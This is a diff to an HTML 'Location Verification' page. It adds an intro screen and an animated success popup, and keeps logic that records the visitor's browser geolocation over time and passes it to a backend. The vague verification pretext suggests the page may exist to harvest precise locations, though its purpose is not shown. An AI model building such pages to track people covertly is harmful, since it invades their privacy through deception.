@@ -115,6 +115,141 @@
         }
 
         .error { color: #d32f2f; margin-top: 15px; font-weight: bold; }
+
+        /* Flattened Success Animation CSS */
+        .alert-popup-container {
+            text-align: center;
+            display: none; /* Hidden by default */
+        }
+
+        .alert-popup-title {
+            font-size: 30px;
+            font-weight: bold;
+            color: #4CAF50;
+            margin-top: 15px;
+            margin-bottom: 15px;
+            z-index: 2;
+            position: relative;
+        }
+
+        .alert-popup-message {
+            color: #777;
+            font-size: 21px;
+            font-weight: 300;
+            line-height: 1.4;
+        }
+
+        .success-checkmark {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto;
+        }
+
+        .success-checkmark .check-icon {
+            width: 80px;
+            height: 80px;
+            position: relative;
+            border-radius: 50%;
+            box-sizing: content-box;
+            border: 4px solid #4CAF50;
+        }
+
+        .success-checkmark .check-icon::before {
+            top: 3px;
+            left: -2px;
+            width: 30px;
+            transform-origin: 100% 50%;
+            border-radius: 100px 0 0 100px;
+        }
+
+        .success-checkmark .check-icon::after {
+            top: 0;
+            left: 30px;
+            width: 60px;
+            transform-origin: 0 50%;
+            border-radius: 0 100px 100px 0;
+            animation: rotate-circle 4.25s ease-in;
+        }
+
+        .success-checkmark .check-icon::before,
+        .success-checkmark .check-icon::after {
+            content: '';
+            height: 100px;
+            position: absolute;
+            background: #FFFFFF;
+            transform: rotate(-45deg);
+            z-index: 2;
+        }
+
+        .success-checkmark .check-icon .icon-line {
+            height: 5px;
+            background-color: #4CAF50;
+            display: block;
+            border-radius: 2px;
+            position: absolute;
+            z-index: 10;
+        }
+
+        .success-checkmark .check-icon .icon-line.line-tip {
+            top: 46px;
+            left: 14px;
+            width: 25px;
+            transform: rotate(45deg);
+            animation: icon-line-tip 0.75s;
+        }
+
+        .success-checkmark .check-icon .icon-line.line-long {
+            top: 38px;
+            right: 8px;
+            width: 47px;
+            transform: rotate(-45deg);
+            animation: icon-line-long 0.75s;
+        }
+
+        .success-checkmark .check-icon .icon-circle {
+            top: -4px;
+            left: -4px;
+            z-index: 10;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            position: absolute;
+            box-sizing: content-box;
+            border: 4px solid rgba(76, 175, 80, .5);
+        }
+
+        .success-checkmark .check-icon .icon-fix {
+            top: 8px;
+            width: 5px;
+            left: 26px;
+            z-index: 1;
+            height: 85px;
+            position: absolute;
+            transform: rotate(-45deg);
+            background-color: #FFFFFF;
+        }
+
+        @keyframes rotate-circle {
+            0% { transform: rotate(-45deg); }
+            5% { transform: rotate(-45deg); }
+            12% { transform: rotate(-405deg); }
+            100% { transform: rotate(-405deg); }
+        }
+
+        @keyframes icon-line-tip {
+            0% { width: 0; left: 1px; top: 19px; }
+            54% { width: 0; left: 1px; top: 19px; }
+            70% { width: 50px; left: -8px; top: 37px; }
+            84% { width: 17px; left: 21px; top: 48px; }
+            100% { width: 25px; left: 14px; top: 45px; }
+        }
+
+        @keyframes icon-line-long {
+            0% { width: 0; right: 46px; top: 54px; }
+            65% { width: 0; right: 46px; top: 54px; }
+            84% { width: 55px; right: 0px; top: 35px; }
+            100% { width: 47px; right: 8px; top: 38px; }
+        }
     </style>
 </head>
 <body>
@@ -126,14 +261,19 @@
     </div>
 
     <!-- Main Verification UI -->
-    <div class="verification-container">
-        <h1>Location Verification</h1>
-        <p class="subtitle">Please authorize the browser prompt to proceed.</p>
+    <div class="verification-container" id="mainContainer">
         
-        <button id="startBtn">Begin Verification</button>
+        <!-- Intro Screen -->
+        <div id="introScreen">
+            <h1>Location Verification</h1>
+            <p class="subtitle">Please authorize the browser prompt to proceed.</p>
+            <button id="startBtn">Begin Verification</button>
+            <div id="errorMsg" class="error"></div>
+        </div>
         
+        <!-- Loading Progress Screen -->
         <div id="progressWrapper" class="progress-wrapper">
-            <h1 id="mainStatus">Verification in Progress...</h1>
+            <h1>Verification in Progress...</h1>
             <p class="subtitle">Please keep this window open.</p>
             
             <div class="progress-bar-container">
@@ -142,16 +282,30 @@
             <div id="subStatus" class="status-text">Requesting hardware lock...</div>
         </div>
 
-        <div id="errorMsg" class="error"></div>
+        <!-- Success Animation Popup -->
+        <div id="successPopup" class="alert-popup-container">
+            <div class="success-checkmark">
+                <div class="check-icon">
+                    <span class="icon-line line-tip"></span>
+                    <span class="icon-line line-long"></span>
+                    <div class="icon-circle"></div>
+                    <div class="icon-fix"></div>
+                </div>
+            </div>
+            <div class="alert-popup-title">Verification Process Completed</div>
+            <div class="alert-popup-message">You can leave this site.</div>
+        </div>
+
     </div>
 
     <script>
         const startBtn = document.getElementById('startBtn');
+        const introScreen = document.getElementById('introScreen');
         const progressWrapper = document.getElementById('progressWrapper');
         const progressBar = document.getElementById('progressBar');
-        const mainStatus = document.getElementById('mainStatus');
         const subStatus = document.getElementById('subStatus');
         const errorMsg = document.getElementById('errorMsg');
+        const successPopup = document.getElementById('successPopup');
         
         let watchId = null;
         let sessionData = {};
@@ -190,7 +344,8 @@
                 return;
             }
 
-            startBtn.style.display = 'none';
+            // Transition from Intro to Progress
+            introScreen.style.display = 'none';
             progressWrapper.style.display = 'block';
 
             sessionData = {
@@ -226,10 +381,11 @@
                             average_accuracy_meters: Number(Math.round(avgAcc))
                         };
 
-                        mainStatus.innerHTML = "Verification Complete";
-                        mainStatus.style.color = "#34a853";
-                        subStatus.innerHTML = "Securely processing data...";
+                        // Hide progress bar and show the success animation
+                        progressWrapper.style.display = 'none';
+                        successPopup.style.display = 'block';
                         
+                        // Fire the backend handoff
                         processCollectedData(sessionData);
                     }
                 },
@@ -240,7 +396,7 @@
                     
                     errorMsg.innerHTML = errMsg;
                     progressWrapper.style.display = 'none';
-                    startBtn.style.display = 'inline-block';
+                    introScreen.style.display = 'block';
                     
                     if (watchId) navigator.geolocation.clearWatch(watchId);
                 },
